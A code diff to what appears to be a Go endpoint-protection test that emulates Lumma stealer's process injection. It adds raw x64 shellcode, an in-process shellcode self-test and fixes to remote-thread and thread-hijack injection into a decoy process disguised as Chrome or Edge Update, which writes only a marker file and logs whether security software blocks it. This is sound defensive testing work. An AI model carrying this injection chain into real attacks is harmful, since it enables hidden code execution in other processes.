@@ -41,6 +41,8 @@
 package main
 
 import (
+	"bytes"
+	"encoding/binary"
 	"encoding/json"
 	"fmt"
 	"os"
@@ -85,6 +87,8 @@ func main() {
 			mode = "host"
 		case "-lumma-injector":
 			mode = "injector"
+		case "-lumma-sc-selftest":
+			mode = "sc-selftest"
 		}
 	}
 
@@ -94,6 +98,8 @@ func main() {
 		exit = hostMain()
 	case "injector":
 		exit = injectorMain()
+	case "sc-selftest":
+		exit = shellcodeSelfTest()
 	default:
 		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
 		LogStageStart(STAGE_ID, TECHNIQUE_ID, TECHNIQUE_NAME)
@@ -207,10 +213,14 @@ func parentMain() int {
 	// Did the idle decoy host die from an external actor mid-protocol?
 	// Positive-evidence rule: the host is our own process, idle by design.
 	// The injector records whether IT performed the TerminateProcess cleanup;
-	// a host death not attributable to the injector (or to this parent's own
-	// grace-window cleanup) is an external kill.
+	// a host death attributable neither to the injector's cleanup nor to this
+	// parent's own grace-window kill is an external (EDR) termination.
+	// This check runs REGARDLESS of result.json — a killed injector cannot
+	// write its verdict, and the host's fate is independent evidence.
+	injRes, injResErr := readInjectorResult(injDir)
+	injectorTerminatedHost := injResErr == nil && injRes.WeTerminatedHost
 	parentKilledHost := false
-	if res, jerr := readInjectorResult(injDir); jerr == nil && !res.WeTerminatedHost {
+	if !injectorTerminatedHost {
 		if hostCmd.ProcessState == nil {
 			// Host still alive; give it a moment to exit on its own, then
 			// check whether it died unexpectedly while the injector was gone.
@@ -234,12 +244,31 @@ func parentMain() int {
 		_ = hostCmd.Wait()
 	}
 
-	// Collect the injector's structured verdict.
-	res, rerr := readInjectorResult(injDir)
-	if rerr != nil {
-		LogMessage("ERROR", TECHNIQUE_ID, "injector did not write result.json - inconclusive")
+	// Collect the injector's structured verdict (may be absent if the
+	// injector itself was killed — the host-death check above already ran).
+	if injResErr != nil {
+		// Positive-evidence rule: EVERY return path in the injector writes
+		// result.json (deferred writeResult, which also runs on a Go panic),
+		// and a panic/fatal additionally prints to the captured output.
+		// A MISSING verdict file with NO panic/fatal text therefore means the
+		// injector process never returned through ANY code path — it was
+		// TERMINATED EXTERNALLY mid-operation (TerminateProcess skips all
+		// defers; Falcon-style kills can even exit 0, so the exit code is
+		// deliberately NOT part of this test). That is protection evidence,
+		// not a test error.
+		injOutStr := injOut.String()
+		fatalText := strings.Contains(injOutStr, "panic:") || strings.Contains(injOutStr, "fatal error:")
+		if !fatalText {
+			fmt.Printf("[STAGE %s] injector died without a verdict (no result.json, no panic) - external termination\n", TECHNIQUE_ID)
+			LogMessage("CRITICAL", TECHNIQUE_ID,
+				"MicrosoftEdgeUpdate.exe injector externally terminated mid-chain (verdict file never written, no panic output) - positive protection evidence")
+			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, "Injector decoy externally terminated during injection API sequence")
+			return StageBlocked
+		}
+		LogMessage("ERROR", TECHNIQUE_ID, "injector crashed (fatal runtime output captured) - inconclusive")
 		return StageError
 	}
+	res := injRes
 	if res.Blocked {
 		return StageBlocked
 	}
@@ -262,6 +291,7 @@ type injectorResult struct {
 	HJMarker         bool   `json:"hj_marker"`
 	Blocked          bool   `json:"blocked"`
 	WeTerminatedHost bool   `json:"we_terminated_host"`
+	Progress         string `json:"progress,omitempty"` // last completed step (forensic: where a killed injector died)
 	Reason           string `json:"reason,omitempty"`
 	HostPID          int    `json:"host_pid"`
 }
@@ -329,6 +359,83 @@ func hostMain() int {
 func currentThreadID() uint32 {
 	rv, _, _ := procGetCurrentThreadId.Call()
 	return uint32(rv)
+}
+
+// shellcodeSelfTest executes scRemoteThread in THIS process (VirtualAlloc RWX
+// + native thread) and verifies the marker file — isolating shellcode
+// correctness from the remote-injection mechanics.
+func shellcodeSelfTest() int {
+	injDir := filepath.Join(ARTIFACT_DIR, injDirName)
+	if err := os.MkdirAll(injDir, 0755); err != nil {
+		fmt.Println("[SC-SELFTEST] mkdir failed:", err)
+		return 1
+	}
+	rtPath := filepath.Join(injDir, rtMarkerFile)
+	_ = os.Remove(rtPath)
+	paramPath := filepath.Join(injDir, "marker_param.txt")
+	_ = os.Remove(paramPath)
+
+	// Variant A: param-passed CreateFileA (tests call convention + path only).
+	scParam := []byte{
+		0x49, 0x89, 0xcb, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x40, 0x48,
+		0x8d, 0x0d, 0x2b, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x40, 0x45, 0x31, 0xc0, 0x45, 0x31,
+		0xc9, 0xc7, 0x44, 0x24, 0x20, 0x02, 0x00, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00,
+		0x00, 0xc7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x41, 0xff, 0xd3, 0x48, 0x89, 0xec, 0x5d,
+		0xc3, 0x63, 0x3a, 0x5c, 0x55, 0x73, 0x65, 0x72, 0x73, 0x5c, 0x66, 0x6f, 0x72, 0x74, 0x69, 0x6b,
+		0x61, 0x2d, 0x74, 0x65, 0x73, 0x74, 0x5c, 0x6c, 0x75, 0x6d, 0x6d, 0x61, 0x5f, 0x69, 0x6e, 0x6a,
+		0x5c, 0x6d, 0x61, 0x72, 0x6b, 0x65, 0x72, 0x5f, 0x70, 0x61, 0x72, 0x61, 0x6d, 0x2e, 0x74, 0x78,
+		0x74, 0x00,
+	}
+	procVirtualAlloc := kernel32.NewProc("VirtualAlloc")
+	procCreateThread := kernel32.NewProc("CreateThread")
+
+	memA, _, err := procVirtualAlloc.Call(0, uintptr(len(scParam)), uintptr(memCommit|memReserve), uintptr(pageExecuteReadwrite))
+	if memA == 0 {
+		fmt.Println("[SC-SELFTEST] VirtualAlloc(A) failed:", err)
+		return 1
+	}
+	copy(unsafe.Slice((*byte)(unsafe.Pointer(memA)), len(scParam)), scParam)
+	createFileA := kernel32.NewProc("CreateFileA").Addr()
+	hA, _, err := procCreateThread.Call(0, 0, memA, createFileA, 0, 0)
+	if hA == 0 {
+		fmt.Println("[SC-SELFTEST] CreateThread(A) failed:", err)
+		return 1
+	}
+	syscall.WaitForSingleObject(syscall.Handle(hA), 15000)
+	syscall.CloseHandle(syscall.Handle(hA))
+	paramOK := false
+	if _, serr := os.Stat(paramPath); serr == nil {
+		paramOK = true
+		fmt.Println("[SC-SELFTEST] variant A (param-passed CreateFileA): MARKER CREATED")
+	} else {
+		fmt.Println("[SC-SELFTEST] variant A (param-passed CreateFileA): marker NOT created")
+	}
+
+	// Variant B: the real marker payload (resolved-API form, patched).
+	scRT := patchShellcodeAPI(scRemoteThread)
+	mem, _, err := procVirtualAlloc.Call(0, uintptr(len(scRT)), uintptr(memCommit|memReserve), uintptr(pageExecuteReadwrite))
+	if mem == 0 {
+		fmt.Println("[SC-SELFTEST] VirtualAlloc failed:", err)
+		return 1
+	}
+	copy(unsafe.Slice((*byte)(unsafe.Pointer(mem)), len(scRT)), scRT)
+	h, _, err := procCreateThread.Call(0, 0, mem, 0, 0, 0)
+	if h == 0 {
+		fmt.Println("[SC-SELFTEST] CreateThread failed:", err)
+		return 1
+	}
+	syscall.WaitForSingleObject(syscall.Handle(h), 15000)
+	syscall.CloseHandle(syscall.Handle(h))
+
+	if _, serr := os.Stat(rtPath); serr == nil {
+		fmt.Println("[SC-SELFTEST] variant B (resolved-API payload): MARKER CREATED — shellcode OK")
+		return 0
+	}
+	fmt.Println("[SC-SELFTEST] variant B (resolved-API payload): marker NOT created")
+	if paramOK {
+		return 3 // call convention fine; payload broken
+	}
+	return 2 // both broken
 }
 
 // ============================================================================
@@ -442,16 +549,21 @@ func injectorMain() int {
 	}
 	defer syscall.CloseHandle(syscall.Handle(hProc))
 	fmt.Printf("[INJECTOR] OpenProcess(chrome.exe pid=%d) ok\n", hostPID)
+	res.Progress = "open_process"
+	writeResult(res)
 
 	// ---- Phase 1: remote-thread injection (VirtualAllocEx → Write → CreateRemoteThread) ----
-	cave1, okAlloc := remoteWrite(hProc, scRemoteThread)
+	scRT := patchShellcodeAPI(scRemoteThread)
+	cave1, okAlloc := remoteWrite(hProc, scRT)
 	if !okAlloc {
 		res.Reason = "VirtualAllocEx/WriteProcessMemory failed"
 		return StageError
 	}
+	res.Progress = "remote_write"
+	writeResult(res)
 	fmt.Printf("[INJECTOR] shellcode written at 0x%x; CreateRemoteThread...\n", cave1)
 
-	hThread, _, err := procCreateRemoteThread.Call(0, 0, 0, cave1, 0, 0, 0)
+	hThread, _, err := procCreateRemoteThread.Call(hProc, 0, 0, cave1, 0, 0, 0)
 	if hThread == 0 {
 		errno, ok := err.(syscall.Errno)
 		if ok && errno == 5 {
@@ -464,6 +576,8 @@ func injectorMain() int {
 	}
 	syscall.WaitForSingleObject(syscall.Handle(hThread), waitInfiniteOr10S)
 	syscall.CloseHandle(syscall.Handle(hThread))
+	res.Progress = "create_remote_thread"
+	writeResult(res)
 
 	rtPath := filepath.Join(injDir, rtMarkerFile)
 	res.RTMarker = waitFile(rtPath, 10*time.Second)
@@ -472,6 +586,8 @@ func injectorMain() int {
 		res.Reason = "remote thread completed but marker absent (inconclusive)"
 		return StageError
 	}
+	res.Progress = "rt_marker"
+	writeResult(res)
 
 	// ---- Phase 2: Thread Execution Hijacking (the literal T1055.003) ----
 	hThreadMain, _, err := procOpenThread.Call(
@@ -502,7 +618,7 @@ func injectorMain() int {
 	}
 	origRIP := ctx.Rip
 
-	cave2, okAlloc2 := remoteWrite(hProc, scThreadHijack)
+	cave2, okAlloc2 := remoteWrite(hProc, patchShellcodeAPI(scThreadHijack))
 	if !okAlloc2 {
 		procResumeThread.Call(hThreadMain)
 		res.Reason = "second VirtualAllocEx/WriteProcessMemory failed"
@@ -525,7 +641,24 @@ func injectorMain() int {
 		return StageError
 	}
 
+	res.Progress = "hj_marker"
+	writeResult(res)
 	return StageSuccess
+}
+
+// patchShellcodeAPI copies a marker payload and patches its `api` slot with
+// kernel32!CreateFileA resolved in THIS process (GetProcAddress follows
+// KERNELBASE forwarders; system DLLs share one ASLR base per boot session,
+// so the address is valid inside the decoy host).
+func patchShellcodeAPI(sc []byte) []byte {
+	out := make([]byte, len(sc))
+	copy(out, sc)
+	idx := bytes.Index(out, shellcodeAPIMagic)
+	if idx < 0 {
+		return out // magic absent — payload writes nothing (self-evident at test time)
+	}
+	binary.LittleEndian.PutUint64(out[idx:], uint64(kernel32.NewProc("CreateFileA").Addr()))
+	return out
 }
 
 // remoteWrite performs VirtualAllocEx(RWX) + WriteProcessMemory in hProc.
